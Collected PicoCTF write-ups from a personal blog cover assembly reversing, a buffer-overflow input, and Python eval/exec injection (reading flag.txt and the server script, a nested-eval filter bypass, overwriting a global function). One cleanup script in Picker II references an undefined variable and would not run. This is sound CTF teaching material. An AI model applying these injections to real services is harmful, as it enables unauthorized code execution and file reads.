[{"content":" Problem Overview In ASM2, we are given assembly source code to reverse engineer. We know that the function takes two arguments: 0x4 and 0x2d\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 asm2: \u0026lt;+0\u0026gt;:\tpush ebp \u0026lt;+1\u0026gt;:\tmov ebp,esp \u0026lt;+3\u0026gt;:\tsub esp,0x10 \u0026lt;+6\u0026gt;:\tmov eax,DWORD PTR [ebp+0xc] \u0026lt;+9\u0026gt;:\tmov DWORD PTR [ebp-0x4],eax \u0026lt;+12\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+15\u0026gt;:\tmov DWORD PTR [ebp-0x8],eax \u0026lt;+18\u0026gt;:\tjmp 0x50c \u0026lt;asm2+31\u0026gt; \u0026lt;+20\u0026gt;:\tadd DWORD PTR [ebp-0x4],0x1 \u0026lt;+24\u0026gt;:\tadd DWORD PTR [ebp-0x8],0xd1 \u0026lt;+31\u0026gt;:\tcmp DWORD PTR [ebp-0x8],0x5fa1 \u0026lt;+38\u0026gt;:\tjle 0x501 \u0026lt;asm2+20\u0026gt; \u0026lt;+40\u0026gt;:\tmov eax,DWORD PTR [ebp-0x4] \u0026lt;+43\u0026gt;:\tleave \u0026lt;+44\u0026gt;:\tret I had to learn how function arguments are managed on the stack, and it wasn\u0026#39;t that bad! Before we walk through the assembly code and get the flag, let\u0026#39;s explore arguments and the stack.\nArguments and the Stackâ€¦ Coming from a background of higher-level languages, I never really had to wonder how arguments in code like below was represented in assembly:\n1 2 def check_number(first, second): return first + second This is a good chance to learn! Let\u0026#39;s see what fancy stuff is going on in the code.\nCreating a New Stack Frame The below sequence is a commonly-found sequence for many compilers. The push and mov instructions sets up a new stack frame.\nThe sub instruction creates space in memory for automatic local variables. You can read about this sequence here.\n1 2 3 4 asm2: \u0026lt;+0\u0026gt;:\tpush ebp \u0026lt;+1\u0026gt;:\tmov ebp,esp \u0026lt;+3\u0026gt;:\tsub esp,0x10 ;; 16 bytes Now, we have a new stack frame with 16 bytes of memory allocated.\nAccessing Function Parameters I found out that there are different conventions for how arguments are passed onto the stack.\nThe assembly code looked like x86, so I assumed it was using the cdecl calling convention.\nIn cdecl, functions arguments are passed onto the stack from right to left.\nSo in the example below, the assembly representation would first push num3 onto the stack, then num2, and finally num1.\n1 2 3 int add(int num1, int num2, int num3) { return num3 + num2 + num1; } For our CTF challenge, we now know that the last function parameter is the first thing pushed onto the stack.\nGetting the 2nd Parameter For this code segment, we get the value 12 bytes above ebp, the 2nd paramter, and push it into eax.\nAfterwards, we move the value from eax 4 bytes below ebp, making it easier to call in our stack frame.\nWe know that the 2nd paramter is 0x2d, or 45.\n1 2 \u0026lt;+6\u0026gt;:\tmov eax,DWORD PTR [ebp+0xc] \u0026lt;+9\u0026gt;:\tmov DWORD PTR [ebp-0x4],eax Getting the 1st Parameter Likewise, we repeat the same process to get the first function parameter, 0x4, into the stack frame.\n1 2 \u0026lt;+12\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] ;; \u0026lt;+15\u0026gt;:\tmov DWORD PTR [ebp-0x8],eax ;; Simple Calculations Now that we know where our function parameter values are, we are left with a relatively straight-forward algorithm to follow:\n1 2 3 4 5 6 7 8 \u0026lt;+18\u0026gt;:\tjmp 0x50c \u0026lt;asm2+31\u0026gt; \u0026lt;+20\u0026gt;:\tadd DWORD PTR [ebp-0x4],0x1 \u0026lt;+24\u0026gt;:\tadd DWORD PTR [ebp-0x8],0xd1 \u0026lt;+31\u0026gt;:\tcmp DWORD PTR [ebp-0x8],0x5fa1 \u0026lt;+38\u0026gt;:\tjle 0x501 \u0026lt;asm2+20\u0026gt; \u0026lt;+40\u0026gt;:\tmov eax,DWORD PTR [ebp-0x4] \u0026lt;+43\u0026gt;:\tleave \u0026lt;+44\u0026gt;:\tret The algorithm is something like:\nIf the first function parameter is less than or equal to 24481\nAdd 1 to the second function parameter Add 209 to the first function parameter Return to the less than or equal comparison If the first function parameter is \u0026gt; 24481, move the second function parameter into eax\nReturn the value in eax More or less, we can translate the assembly code here into this simple Python script:\n1 2 3 4 5 6 7 8 9 10 arg_1 = 4 arg_2 = 45 counter = 0 while arg_1 \u0026lt;= 24481: arg_2 += 1 arg_1 += 209 counter += 1 print(f\u0026#34;looped {counter} times, arg1: {arg_1}, arg2: {arg_2}\u0026#34;) Running the Python Script When we run the Python script, the output is: looped 118 times, arg1: 24666, arg2: 163\nWe know that the function returns the value of arg2, so the flag is simply the hexadecimal representation of 163, or 0xA3\n","permalink":"http://localhost:1313/posts/asm2/","summary":"Learning how function arguments are referenced in assembly. Fun!","title":"PicoCTF: ASM2"},{"content":" Problem Overview We are given a binary executable and the associated source code. Somehow, we need to exploit the below code with user input to get the flag printed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define BUFSIZE 32 #define FLAGSIZE 64 char flag[FLAGSIZE]; void sigsegv_handler(int sig) { printf(\u0026#34;\\n%s\\n\u0026#34;, flag); fflush(stdout); exit(1); } int on_menu(char *burger, char *menu[], int count) { for (int i = 0; i \u0026lt; count; i++) { if (strcmp(burger, menu[i]) == 0) return 1; } return 0; } void serve_patrick(); void serve_bob(); int main(int argc, char **argv){ FILE *f = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(flag, FLAGSIZE, f); signal(SIGSEGV, sigsegv_handler); gid_t gid = getegid(); setresgid(gid, gid, gid); serve_patrick(); return 0; } void serve_patrick() { printf(\u0026#34;%s %s\\n%s\\n%s %s\\n%s\u0026#34;, \u0026#34;Welcome to our newly-opened burger place Pico \u0026#39;n Patty!\u0026#34;, \u0026#34;Can you help the picky customers find their favorite burger?\u0026#34;, \u0026#34;Here comes the first customer Patrick who wants a giant bite.\u0026#34;, \u0026#34;Please choose from the following burgers:\u0026#34;, \u0026#34;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe\u0026#34;, \u0026#34;Enter your recommendation: \u0026#34;); fflush(stdout); char choice1[BUFSIZE]; scanf(\u0026#34;%s\u0026#34;, choice1); char *menu1[3] = {\u0026#34;Breakf@st_Burger\u0026#34;, \u0026#34;Gr%114d_Cheese\u0026#34;, \u0026#34;Bac0n_D3luxe\u0026#34;}; if (!on_menu(choice1, menu1, 3)) { printf(\u0026#34;%s\u0026#34;, \u0026#34;There is no such burger yet!\\n\u0026#34;); fflush(stdout); } else { int count = printf(choice1); if (count \u0026gt; 2 * BUFSIZE) { serve_bob(); } else { printf(\u0026#34;%s\\n%s\\n\u0026#34;, \u0026#34;Patrick is still hungry!\u0026#34;, \u0026#34;Try to serve him something of larger size!\u0026#34;); fflush(stdout); } } } void serve_bob() { printf(\u0026#34;\\n%s %s\\n%s %s\\n%s %s\\n%s\u0026#34;, \u0026#34;Good job! Patrick is happy!\u0026#34;, \u0026#34;Now can you serve the second customer?\u0026#34;, \u0026#34;Sponge Bob wants something outrageous that would break the shop\u0026#34;, \u0026#34;(better be served quick before the shop owner kicks you out!)\u0026#34;, \u0026#34;Please choose from the following burgers:\u0026#34;, \u0026#34;Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak\u0026#34;, \u0026#34;Enter your recommendation: \u0026#34;); fflush(stdout); char choice2[BUFSIZE]; scanf(\u0026#34;%s\u0026#34;, choice2); char *menu2[3] = {\u0026#34;Pe%to_Portobello\u0026#34;, \u0026#34;$outhwest_Burger\u0026#34;, \u0026#34;Cla%sic_Che%s%steak\u0026#34;}; if (!on_menu(choice2, menu2, 3)) { printf(\u0026#34;%s\u0026#34;, \u0026#34;There is no such burger yet!\\n\u0026#34;); fflush(stdout); } else { printf(choice2); fflush(stdout); } } Exploring Possible Vulnerabilities SIGSEGV Because we have the source code and we know that a function exists to print the code, let\u0026#39;s see the control flow with printing the flag.\nIt looks like the program will output the contents of the flag if given a SIGSEGV signal. This code is wrapped in the sigsegv_handler function.\n1 2 3 4 5 void sigsegv_handler(int sig) { printf(\u0026#34;\\n%s\\n\u0026#34;, flag); fflush(stdout); exit(1); } The SIGSEGV signal comes from memory access violations, so let\u0026#39;s poke around the code and see if there is any problematic memory handling.\nBuffers The code declares a buffer size of 32 bytes, but does not check if user input will fit into the buffer:\n1 2 3 4 5 6 #define BUFSIZE 32 #define FLAGSIZE 64 ... char choice1[BUFSIZE]; scanf(\u0026#34;%s\u0026#34;, choice1); So, we should be able to just provide a long string and get the flag.\nExploiting the Buffer 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026gt; nc mimas.picoctf.net 54844 Welcome to our newly-opened burger place Pico \u0026#39;n Patty! Can you help the picky customers find their favorite burger? Here comes the first customer Patrick who wants a giant bite. Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe Enter your recommendation: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa There is no such burger yet! picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4} ","permalink":"http://localhost:1313/posts/formatstring0/","summary":"Introduction to Buffer Overflows","title":"PicoCTF: Format String 0"},{"content":"Problem Overview We are given an assembly file. We are asked to output what asm1(0x2e0) returns.\nLet\u0026rsquo;s take a look at the assembly file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 asm1: \u0026lt;+0\u0026gt;:\tpush ebp \u0026lt;+1\u0026gt;:\tmov ebp,esp \u0026lt;+3\u0026gt;:\tcmp DWORD PTR [ebp+0x8],0x3fb \u0026lt;+10\u0026gt;:\tjg 0x512 \u0026lt;asm1+37\u0026gt; \u0026lt;+12\u0026gt;:\tcmp DWORD PTR [ebp+0x8],0x280 \u0026lt;+19\u0026gt;:\tjne 0x50a \u0026lt;asm1+29\u0026gt; \u0026lt;+21\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+24\u0026gt;:\tadd eax,0xa \u0026lt;+27\u0026gt;:\tjmp 0x529 \u0026lt;asm1+60\u0026gt; \u0026lt;+29\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+32\u0026gt;:\tsub eax,0xa \u0026lt;+35\u0026gt;:\tjmp 0x529 \u0026lt;asm1+60\u0026gt; \u0026lt;+37\u0026gt;:\tcmp DWORD PTR [ebp+0x8],0x559 \u0026lt;+44\u0026gt;:\tjne 0x523 \u0026lt;asm1+54\u0026gt; \u0026lt;+46\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+49\u0026gt;:\tsub eax,0xa \u0026lt;+52\u0026gt;:\tjmp 0x529 \u0026lt;asm1+60\u0026gt; \u0026lt;+54\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+57\u0026gt;:\tadd eax,0xa \u0026lt;+60\u0026gt;:\tpop ebp \u0026lt;+61\u0026gt;:\tret Some quick observations:\nIt looks like we are using Intel syntax It looks like we just need to run through some conditional checks for the given input value. We should focus on jumping to the right labels. Walking Through the Code First Comparison Our input, 0x2e0, is 736 in decimal. I will leave some notes on converted hexadecimal values as we work through the code.\n1 2 3 4 5 6 7 ;; input value to asm1: 736 asm1: \u0026lt;+0\u0026gt;:\tpush ebp \u0026lt;+1\u0026gt;:\tmov ebp,esp \u0026lt;+3\u0026gt;:\tcmp DWORD PTR [ebp+0x8],0x3fb ;; 1019 ;; if the input value is \u0026gt; 1019, jump to 0x512 \u0026lt;+10\u0026gt;:\tjg 0x512 \u0026lt;asm1+37\u0026gt; In this first block, we check if the value on the stack is greater than 1019. With our input value of 736, we don\u0026rsquo;t jump. Instead, we keep walking through the assembly.\nSecond Comparison 1 2 3 \u0026lt;+12\u0026gt;:\tcmp DWORD PTR [ebp+0x8],0x280 ;; 640 ;; if the input value is not equal to 640, jump to 0x50a \u0026lt;+19\u0026gt;:\tjne 0x50a \u0026lt;asm1+29\u0026gt; Here, we check if the input is not equal to 640. It actually is not, so let\u0026rsquo;s jump to 0x50a.\nEAX Shenanigans 1 2 3 \u0026lt;+29\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] ;; eax = 736 \u0026lt;+32\u0026gt;:\tsub eax,0xa ;; eax = 726 \u0026lt;+35\u0026gt;:\tjmp 0x529 \u0026lt;asm1+60\u0026gt; Here, we move the input value, 736, on the stack into the eax register.\nThen, we subtract 10 from eax, leaving its value at 726. Let\u0026rsquo;s jump to 0x529.\nReturn 1 2 \u0026lt;+60\u0026gt;:\tpop ebp \u0026lt;+61\u0026gt;:\tret Here, we just pop the base pointer and return. After converting 726 from the eax register to hexadecimal, we get 2D6.\nThe CTF asks us to input the value in the format 0x\u0026lt;RETURN_VALUE\u0026gt;, so the flag is just 0x2D6.\n","permalink":"http://localhost:1313/posts/asm1/","summary":"Counting in assembly.","title":"PicoCTF: ASM1"},{"content":"Investigating the Server When we connect, we are prompted to input getRandomNumber. That works, but what happens if we provide an invalid input?\n1 2 3 4 5 6 7 Try entering \u0026#34;getRandomNumber\u0026#34; without the double quotes... ==\u0026gt; getRandomNumber 4 Try entering \u0026#34;getRandomNumber\u0026#34; without the double quotes... ==\u0026gt; 4 \u0026#39;int\u0026#39; object is not callable Providing invalid input shows what looks like a Python error message. This suggests that user input might not be sanitized properly. Let\u0026rsquo;s test if we can provide Python input directly:\n1 2 3 Try entering \u0026#34;getRandomNumber\u0026#34; without the double quotes... ==\u0026gt; getRandomNumber(123123) getRandomNumber() takes 0 positional arguments but 1 was given It turns out we can execute Python code! This means that we can now explore the contents of the Python script running on the server.\nSo, let\u0026rsquo;s try printing the contents of the file with this one liner:\n1 print(open(__file__).read()) And, that outputs the contents of the entire Python script running on the server!\nInvestigating the Python File Parsing through the output, we see this function:\n1 2 3 4 5 6 7 8 9 10 def win(): # This line will not work locally unless you create your own \u0026#39;flag.txt\u0026#39; in # the same directory as this script flag = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read() #flag = flag[:-1] flag = flag.strip() str_flag = \u0026#39;\u0026#39; for c in flag: str_flag += str(hex(ord(c))) + \u0026#39; \u0026#39; print(str_flag) Now, we know that flag.txt is being read from the Python script. So, we have two choices:\nOpen flag.txt using arbitrary Python code Reverse the encryption provided in the win() function Opening flag.txt Directly Remember how we read the contents of the servers Python script? Because we know where flag.txt is\u0026hellip; we can just open the file path directly.\n1 print(open(\u0026#34;flag.txt\u0026#34;).read()) This outputs the flag: picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}\nReversing the Encryption Opening the file directly is too easy! Let\u0026rsquo;s have some fun.\nAfter executing win() on the server, we get this returned to us:\n1 0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d Remember that win() function we discovered in the Python file? It converted each character of the flag into the hex representation of the character\u0026rsquo;s unicode value (ord(c)):\n1 2 3 ... for c in flag: str_flag += str(hex(ord(c))) + \u0026#39; \u0026#39; We simply just need to reverse the operations provided in the above code snippet.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # list comprehensions are super, super nice to know. # https://www.programiz.com/python-programming/list-comprehension # hex string from win() output starting_flag = \u0026#34;0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d\u0026#34; # split the string into individual hex codes split_flag = starting_flag.split(\u0026#34; \u0026#34;) # convert each hex code back its original character transformed_flag = \u0026#34;\u0026#34;.join(chr(int(word, 16)) for word in split_flag) print(transformed_flag) # picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b} ","permalink":"http://localhost:1313/posts/picker1/","summary":"Using the eval function? Not good.","title":"PicoCTF: Picker I"},{"content":"Investigating the Source Code In this challenge, we are provided with the source code of the script directly.\nHere are the interesting snippets of the source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def filter(user_input): if \u0026#39;win\u0026#39; in user_input: return False return True while(True): try: user_input = input(\u0026#39;==\u0026gt; \u0026#39;) if( filter(user_input) ): eval(user_input + \u0026#39;()\u0026#39;) else: print(\u0026#39;Illegal input\u0026#39;) except Exception as e: print(e) break It looks like the entrypoint for the server uses a helper function, filter(), to determine if the user is trying to call the win() function.\nThe important thing to note is that the code assumes any input past the filter() function is valid, so it does not perform any additional checks.\nSo, we just need to get the user_input variable to evaluate to the string \u0026ldquo;win\u0026rdquo; when the server executes our Python code.\nThe Nested Eval Approach Intuition We know that we need the user_input variable to evaluate to \u0026ldquo;win\u0026rdquo; after the server executes our code. So, we can provide as input an eval() function that evaluates to \u0026ldquo;win\u0026rdquo;.\nImplementation In this case, I just had a short line of code that converted the ASCII values of \u0026ldquo;w\u0026rdquo;, \u0026ldquo;i\u0026rdquo;, \u0026ldquo;n\u0026rdquo; to their respective characters, and added them into the single word \u0026ldquo;win\u0026rdquo;.\n1 eval(chr(119) + chr(105) + chr(110)) # win On the server, this essentially gets represented like below:\n1 eval(eval(chr(119) + chr(105) + chr(110)) + \u0026#39;()\u0026#39;) After the nested eval() call, the server essentially executes the below code, which outputs the flag:\n1 eval(\u0026#34;win\u0026#34; + \u0026#39;()\u0026#39;) # -\u0026gt; eval(\u0026#34;win()\u0026#34;) Cleaning Up the Flag Similar to Picker I, the output of the flag is a space separated string of hex codes:\n1 0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d So, we can write a tiny Python script to clean up this text and output the flag:\n1 2 3 4 5 6 7 flag = \u0026#34;0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d\u0026#34; flag = flag.split(\u0026#34; \u0026#34;) print(\u0026#34;\u0026#34;.join(chr(int(word, 16)) for char in flag if char != \u0026#34;\u0026#34;) # picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590} ","permalink":"http://localhost:1313/posts/picker2/","summary":"Navigating around a simple substring check.","title":"PicoCTF: Picker II"},{"content":"Investigating the Source Code In this CTF, we are given the source code for the Python script running on the server. This file is much more involved than Picker I/II, so let\u0026rsquo;s break down how the code works.\nCode Breakdown Getting User Input The script will run in a loop, waiting for user input. It calls various functions given user input:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 while(USER_ALIVE): choice = input(\u0026#39;==\u0026gt; \u0026#39;) if( choice == \u0026#39;quit\u0026#39; or choice == \u0026#39;exit\u0026#39; or choice == \u0026#39;q\u0026#39; ): USER_ALIVE = False elif( choice == \u0026#39;help\u0026#39; or choice == \u0026#39;?\u0026#39; ): help_text() elif( choice == \u0026#39;reset\u0026#39; ): reset_table() elif( choice == \u0026#39;1\u0026#39; ): call_func(0) elif( choice == \u0026#39;2\u0026#39; ): call_func(1) elif( choice == \u0026#39;3\u0026#39; ): call_func(2) elif( choice == \u0026#39;4\u0026#39; ): call_func(3) else: print(\u0026#39;Did not understand \u0026#34;\u0026#39;+choice+\u0026#39;\u0026#34; Have you tried \u0026#34;help\u0026#34;?\u0026#39;) Handling User Input The code holds a \u0026ldquo;table\u0026rdquo; mapping numbers 1 through 4 to different functions, which roughly looks like:\nInput Number Function in Code 1 print_table() 2 read_variable() 3 write_variable() 4 getRandomNumber() After parsing through the various functions, the interesting function is the write_variable() function:\n1 2 3 4 5 6 7 8 9 10 def write_variable(): var_name = input(\u0026#39;Please enter variable name to write: \u0026#39;) if( filter_var_name(var_name) ): value = input(\u0026#39;Please enter new value of variable: \u0026#39;) if( filter_value(value) ): exec(\u0026#39;global \u0026#39;+var_name+\u0026#39;; \u0026#39;+var_name+\u0026#39; = \u0026#39;+value) else: print(\u0026#39;Illegal value\u0026#39;) else: print(\u0026#39;Illegal variable name\u0026#39;) The key line is exec(f'global {var_name}; {var_name} = {value}'), which executes code to create or modify a global variable with the specified name and value.\nGlobal Variable Implications The global keyword allows modification of global variables from within functions. In Python, global functions and variables are accessible throughout the module. By using write_variable(), we can modify any global variable, including functions.\nHere are some functions in the global scope of the file:\nFunction Name Side Effect win() outputs flag read_variable() outputs global scoped variable write_variable() writes a value to a global variable getRandomNumber() outputs \u0026lsquo;4\u0026rsquo; Since we can modify any global value, we can change getRandomNumber() to point to win(), which will allow us to obtain the flag.\nGetting the Flag After connecting to the server, let\u0026rsquo;s run the write_variable() function, and then run our modified getRandomNumber() function:\nInput Number Function in Code 1 print_table() 2 read_variable() 3 write_variable() 4 getRandomNumber() 1 2 3 4 5 ==\u0026gt; 3 Please enter variable name to write: getRandomNumber Please enter new value of variable: win ==\u0026gt; 4 0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d We got the flag! Let\u0026rsquo;s clean it up.\n1 2 3 4 5 6 flag = \u0026#34;0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d\u0026#34; flag = flag.split(\u0026#34; \u0026#34;) flag = \u0026#34;\u0026#34;.join(chr(int(word, 16)) for word in flag) # picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285} ","permalink":"http://localhost:1313/posts/picker3/","summary":"Exploiting global values!","title":"PicoCTF: Picker III"}]